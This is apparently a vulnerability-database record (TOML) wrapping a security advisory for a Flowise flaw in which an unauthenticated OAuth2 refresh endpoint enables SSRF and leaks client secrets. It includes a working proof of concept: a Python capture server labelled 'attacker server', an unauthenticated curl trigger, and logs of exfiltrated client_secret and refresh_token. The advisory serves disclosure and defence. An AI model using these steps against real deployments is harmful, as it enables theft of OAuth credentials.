@@ -1,0 +1,155 @@
+[basic]
+description = '''
+### Summary
+
+The OAuth2 token refresh endpoint (`POST /api/v1/oauth2-credential/refresh/:credentialId`) is unauthenticated by design (it is in the public whitelist) and performs a server-side HTTP request to a credential-controlled URL (`accessTokenUrl`) without SSRF protections. In runtime validation, this endpoint was reachable without auth, triggered outbound POST requests to an attacker-controlled server, and reflected the full remote response body to the caller (`tokenInfo`), confirming non-blind SSRF and credential secret exfiltration.
+
+### Details
+
+The vulnerability is in `dist/routes/oauth2/index.js` (container runtime build), under path prefix `/api/v1/oauth2-credential`.
+
+Confirmed in runtime code:
+
+1. **Unauthenticated route via whitelist**
+   - `dist/utils/constants.js` includes:
+     - `/api/v1/oauth2-credential/callback`
+     - `/api/v1/oauth2-credential/refresh`
+   - `dist/index.js` auth middleware uses:
+     - `const isWhitelisted = whitelistURLs.some((url) => req.path.startsWith(url))`
+   - Therefore `/api/v1/oauth2-credential/refresh/:credentialId` is treated as whitelisted.
+
+2. **User-controlled SSRF target**
+   - In refresh handler (`dist/routes/oauth2/index.js`):
+     - loads credential by `credentialId`
+     - decrypts credential data
+     - reads `accessTokenUrl`
+     - executes:
+       - `axios.post(tokenUrl, new URLSearchParams(refreshRequestData).toString(), ...)`
+   - No `secureAxiosRequest()` / denylist wrapper is used in this path.
+
+3. **Non-blind response reflection**
+   - Response returns:
+     - `tokenInfo: { ...tokenData, ... }`
+   - `tokenData` is the attacker/internal server response body.
+
+4. **Secrets sent to SSRF target**
+   - Request body includes:
+     - `client_id`
+     - `client_secret`
+     - `grant_type=refresh_token`
+     - `refresh_token`
+
+### PoC
+
+#### Environment used
+
+- `flowiseai/flowise:latest` container (`localhost:3000`)
+- Attacker server (`localhost:18081`) returning JSON
+
+#### Step 1: Start attacker server
+
+```bash
+python3 -u - <<'PY'
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import json
+
+class H(BaseHTTPRequestHandler):
+    def do_POST(self):
+        l = int(self.headers.get('Content-Length','0'))
+        b = self.rfile.read(l).decode('utf-8', errors='replace')
+        print('REQUEST_PATH', self.path, flush=True)
+        print('REQUEST_BODY', b, flush=True)
+        self.send_response(200)
+        self.send_header('Content-Type','application/json')
+        self.end_headers()
+        self.wfile.write(json.dumps({'ok': True, 'source': 'attacker-server', 'echo_len': len(b)}).encode())
+    def log_message(self, fmt, *args):
+        pass
+
+HTTPServer(('0.0.0.0', 18081), H).serve_forever()
+PY
+```
+
+#### Step 2: Create OAuth2 credential with attacker `accessTokenUrl` (authenticated action)
+
+In validation, this was done via authenticated API path (credential creation requires auth/permissions), then refresh was tested publicly.
+
+Resulting credential ID used in runtime validation:
+
+- `24c0b18b-ff6e-4d81-a9a7-26ea8ddccdef`
+
+#### Step 3: Trigger refresh **without auth**
+
+```bash
+curl -i -X POST \
+  http://127.0.0.1:3000/api/v1/oauth2-credential/refresh/24c0b18b-ff6e-4d81-a9a7-26ea8ddccdef \
+  -H 'Content-Type: application/json' \
+  -d '{}'
+```
+
+Observed response:
+
+```json
+{
+  \"success\": true,
+  \"message\": \"OAuth2 token refreshed successfully\",
+  \"credentialId\": \"24c0b18b-ff6e-4d81-a9a7-26ea8ddccdef\",
+  \"tokenInfo\": {
+    \"ok\": true,
+    \"source\": \"attacker-server\",
+    \"echo_len\": 76,
+    \"has_new_refresh_token\": false
+  }
+}
+```
+
+Attacker server logs captured:
+
+```text
+REQUEST_PATH /token
+REQUEST_BODY client_id=cid2&client_secret=csec2&grant_type=refresh_token&refresh_token=r2
+```
+
+This confirms:
+- unauthenticated trigger,
+- server-side POST to attacker-controlled URL,
+- exfiltration of OAuth2 secrets in POST body,
+- full response reflection to client (`tokenInfo`).
+
+### Impact
+
+- **Vulnerability class:** Non-blind SSRF + sensitive secret exfiltration.
+- **Who can set up attack:** Any authenticated user who can create/update OAuth2 credentials.
+- **Who can trigger attack:** Anyone who knows a valid OAuth2 credential UUID (refresh endpoint is public/whitelisted).
+- **Technical impact:**
+  - outbound SSRF to attacker/internal targets,
+  - direct leak of `client_secret` and `refresh_token` to SSRF target,
+  - direct response read from target via API response (`tokenInfo`).
+- **Deployment impact:**
+  - cloud/internal network reachability can expose metadata/internal services depending on egress controls.
+'''
+published = "2026-01-01T00:00:00Z"
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "Flowise: Unauthenticated OAuth2 Refresh Enables Non-Blind SSRF and Secret Exfiltration"
+updated = "2026-01-01T00:00:00Z"
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = [
+    "CVE-2026-69250",
+    "GHSA-r745-8hwv-h473",
+]
+ave_id = "AVE-2026-1331"
+
+[meta]
+collected_at = "2026-08-07T12:24:07Z"
+status = "completed"
+
+[references]
+urls = []
